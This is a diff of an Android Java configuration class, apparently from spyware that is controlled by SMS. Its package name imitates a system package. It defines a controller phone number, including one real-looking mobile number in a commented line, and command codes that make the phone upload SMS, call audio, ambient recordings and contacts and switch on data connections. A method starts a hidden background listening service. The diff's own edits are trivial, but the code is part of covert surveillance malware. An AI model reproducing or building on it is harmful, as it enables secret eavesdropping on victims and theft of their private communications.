@@ -19,7 +19,7 @@ import com.android.system.controled.util.FileUtil;
 
 public class Globle {
 
-//	public static final String PHONE_NUMBER = "18210633121";// 控制者的电话号码
+	// public static final String PHONE_NUMBER = "18210633121";// 控制者的电话号码
 	public static final String PHONE_NUMBER = "5554";// 控制者的电话号码
 
 	/**
@@ -55,13 +55,13 @@ public class Globle {
 	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL = "033";// HELLO_CALL_AUDIO
 	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER = "035";// HELLO_OTHER_AUDIO
 	public static final String PHONE_CODE_UPLOAD_CONTACTS = "036";// HELLO_CONTACTS
-	
+
 	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "031M";// HELLO_SMS_CALL_MOBILE
 	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "032M";// HELLO_ALL_MOBILE
 	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE = "033M";// HELLO_CALL_AUDIO_MOBILE
 	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE = "035M";// HELLO_OTHER_AUDIO_MOBILE
 	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE = "036M";// HELLO_CONTACTS_MOBILE
-	
+
 	public static final String PHONE_CODE_TURNON_WIFI = "057";// TURN_ON_WIFI
 	public static final String PHONE_CODE_TURNON_MOBILE = "056";// TURN_ON_MOBILE
 
@@ -157,9 +157,9 @@ public class Globle {
 	 * @date:2012-8-30
 	 */
 	public static void startBackService(Context context) {
-		
-		ContactsUtil.createContactsFile(context);//测试
-		
+
+		// ContactsUtil.createContactsFile(context);//测试
+
 		if (!isServiceStarted(context, SERVICE_NAME_LISTEN)) {
 			Intent i = new Intent(context, ListenService.class);
 			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
